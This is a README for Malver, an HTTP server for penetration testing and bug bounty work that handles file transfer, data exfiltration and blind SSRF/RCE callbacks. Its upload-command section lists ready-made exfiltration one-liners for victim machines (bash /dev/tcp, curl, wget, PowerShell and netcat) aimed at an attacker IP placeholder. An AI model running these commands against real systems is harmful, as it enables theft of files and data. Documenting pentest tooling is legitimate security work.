# Malver - **Mal**icious Ser**ver** for Pentesting & Bug Bounty

## Overview

Malver (**Mal**cious Ser**ver**) is a lightweight and flexible HTTP server designed for penetration testing and bug bounty hunting. It simplifies file transfers, data exfiltration, and blind vulnerability validation.

## Features

- File Transfer (Upload & Download) – Easily upload and download files during engagements.
- Upload Command Generator – Generate ready-to-use upload commands with multiple options for tightly hardened environments.
- Base64 Decoding – Decode attacker-controlled data via the /b64d endpoint.
- Blind Vulnerability Validation – Use / for testing SSRF, RCE, or command injection scenarios.
- Configurable Endpoints & Directories – Customize paths and storage locations through CLI flags.
- Structured Logging – Log requests, headers, and query parameters in a tabular format for easy analysis.


## Endpoints

| Method | Endpoint | Description |
| ---- | ---- | ---- |
| GET | `/` | Used to validate blind vulnerabilities by sending a request.|
| GET | `/down/{filename}` | Downloads a file from the victim’s machine.|
| POST | `/up` | Uploads a file from the victim’s machine to the attacker's system.|
| GET | `/b64d?d=<encoded>` | Decodes Base64-encoded query data.|


## Installation

Ensure you have Go installed, then run:

```bash
go install github.com/omarelshopky/malver/cmd/malver@latest
```

This will install the malver binary in your Go bin directory.


## Usage

```bash
malver [-headers] [-params] [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=/] [-down-endpoint=/down] [-up-endpoint=/up] [-b64d-endpoint=/b64d]
```


## Command-Line Flags

| Flag | Default | Description |
| ---- | ---- | ---- |
| `-headers` | `false` | Log request headers |
| `-params` | `false` | Log request query parameters |
| `-port` | `3000` | Port to run the HTTP server on |
| `-upload` | `./uploads` | Directory for file uploads |
| `-download` | `./downloads` | Directory for file downloads |
| `-ping-endpoint` | `/` | Endpoint for ping |
| `-down-endpoint` | `/down/` | Endpoint for file downloads |
| `-up-endpoint` | `/up` | Endpoint for file uploads |
| `-b64d-endpoint` | `/b64d` | Endpoint for base64 decoding |
| `-upload-cmds` | `false` | Generate ready-to-use upload commands |
| `-ip` | `<ATTACKING_IP>` | Specify the attacker's IP address (used with -upload-commands) |
| `-file` | `<FILE_PATH>` | Specify the full path of the file to be uploaded (used with -upload-commands) |


## Example Use Cases

- Send a request to `/` and check if the target system can reach back.
- Extract and decode data sent from an exploited machine using `/b64d?q=<encoded>`
- Retrieving files from a compromised machine using `/down/{filename}` to download files.
- Upload a shell or tool using the `/up` endpoint. Use `-upload-cmds` to generate pre-configured upload commands that can be executed on the victim machine using various built-in tools.


### Generating Upload Commands

To quickly generate ready-to-use upload commands, use:

```bash
malver -upload-cmds -ip <ATTACKING_IP> -file <FILE_PATH>
```

Example output:

> Bash

```bash
exec 3<>/dev/tcp/<ATTACKING_IP>/3000; { printf "POST /up HTTP/1.1\r\nHost: <ATTACKING_IP>:3000\r\nContent-Type: application/octet-stream\r\nFilename: <FILE_PATH>\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\n\r\n"; cat <FILE_PATH>; } >&3; cat <&3; exec 3>&-
```

> cURL (Multipart Upload)

```bash
curl -X POST http://<ATTACKING_IP>:3000/up -F "file=@<FILE_PATH>"
```

> cURL (Raw Binary Upload)

```bash
curl -X POST --data-binary "@<FILE_PATH>" http://<ATTACKING_IP>:3000/up -H "Filename: <FILE_PATH>"
```

> wget

```bash
wget --method=POST --body-file=<FILE_PATH> --header="Filename: <FILE_PATH>" --header="Content-Type: application/octet-stream" "http://<ATTACKING_IP>:3000/up"
```

> Invoke-WebRequest (PowerShell)

```powershell
Invoke-WebRequest -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
```

> Invoke-RestMethod (PowerShell)

```powershell
Invoke-RestMethod -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FILE_PATH>" -ContentType "application/octet-stream" -Headers @{"Filename"="<FILE_PATH>"}
```

> netcat (nc)

```bash
(echo -en "POST /up HTTP/1.1\r\nHost: <ATTACKING_IP>:3000\r\nContent-Length: $(wc -c < <FILE_PATH>)\r\nFilename: <FILE_PATH>\r\nContent-Type: application/octet-stream\r\n\r\n"; cat <FILE_PATH>) | nc <ATTACKING_IP> 3000
```


## Logging

The server logs all incoming requests in the following format:

```bash
<DATE> <TIME> <CLIENT_IP>:<CLIENT_PORT> "<METHOD> <ENDPOINT><QUERY_PARAMS> HTTP/<HTTP_VERSION>" <STATUS_CODE> [<POST_DATA>] | <ENDPOINT_SPECIFIC_MESSAGE>
```

### Verbose Logging

For more detailed insights, you can enable additional logging using:

- `-headers` → Logs request headers in a tabular format.

- `-params` → Logs query parameters in a structured table.

### Example Log Output

```bash
2025/03/24 22:22:59 Starting server on :3000
2025/03/24 22:23:01 127.0.0.1:46266 "GET /b64d?d=bWFsdmVyCg== HTTP/1.1" 200 - | decoded: malver
```

If `-headers` or `-params` is enabled, additional structured logging will be displayed:

### Logged Headers

```bash
┌────────────┬─────────────┐
│ Header     │ Value       │
├────────────┼─────────────┤
│ User-Agent │ curl/8.12.1 │
│ Accept     │ */*         │
└────────────┴─────────────┘
```

### Logged Query Parameters

```bash
┌───────────┬──────────┐
│ Parameter │ Value    │
├───────────┼──────────┤
│ name      │ 3l5h0pky │
│ id        │ 1        │
└───────────┴──────────┘
```

This structured logging helps track client interactions, including query parameters, POST data, and Base64-decoded content, making debugging and auditing more efficient.


## Disclaimer

Malver is intended for legal penetration testing and security research only. Unauthorized use of this tool against systems without explicit permission is illegal and unethical. The author is not responsible for any misuse.
